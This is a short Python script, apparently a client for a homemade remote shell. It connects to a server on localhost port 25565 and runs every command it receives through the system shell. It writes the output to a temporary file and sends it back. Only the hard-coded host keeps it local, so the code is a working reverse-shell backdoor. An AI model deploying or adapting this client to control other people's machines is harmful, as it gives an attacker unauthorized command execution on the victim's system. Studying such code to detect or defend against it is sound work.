
# -*- coding: utf-8 -*
import socket
import os
import subprocess
import time
import sys

def cmdrecv():
	cmd = server_co.recv(1024)
	print(cmd)
	cmd = str(cmd).replace("b'", "")
	cmd = str(cmd).replace("'", "")
	if "echo" in str(cmd):
		subprocess.Popen(cmd, shell=True)

	else:
		command = str(cmd) + " > out.txt"
		subprocess.Popen(command, shell=True)
		time.sleep(0.5)
		file = open("out.txt", "r+")
		retour = file.read(1024)
		server_co.send(str(retour).encode('ascii','ignore'))
		file.close()
		os.remove("out.txt")
		cmd = ""

def sendconfirm():
	print ("command executed")
hote = "127.0.0.1"
port = 25565
location = os.path.realpath(__file__)
location = location.replace("client.py", "")
server_co = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_co.connect((hote, port))
print("[*] Connected")
msg = ""
while msg != "fin":
	cmdrecv()
	sendconfirm()
print("[*] Session close")
server_co.close()
